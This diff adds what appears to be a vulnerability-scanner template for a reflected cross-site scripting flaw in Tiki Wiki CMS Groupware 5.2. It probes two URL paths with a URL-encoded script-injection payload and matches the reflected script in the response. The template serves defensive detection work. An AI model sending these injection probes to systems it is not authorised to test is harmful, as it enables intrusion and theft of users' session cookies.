@@ -1,0 +1,32 @@
+id: tikiwiki-reflected-xss
+name: Tiki Wiki CMS Groupware 5.2 - Cross-Site Scripting
+severity: high
+confidence: tentative
+description: Tiki Wiki CMS Groupware 5.2 contains a cross-site scripting vulnerability. An attacker can execute arbitrary
+  script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal
+  cookie-based authentication credentials and launch other attacks.
+reference: CWE-79
+tags:
+- packetstorm
+- edb
+- xss
+- tikiwiki
+- vuln
+requests:
+- method: GET
+  path: /tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
+  matchers: &id001
+  - type: status
+    status:
+    - 200
+  - type: body
+    words:
+    - <script>alert(31337)</script>
+  - type: header
+    words:
+    - text/html
+  condition: and
+- method: GET
+  path: /tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
+  matchers: *id001
+  condition: and
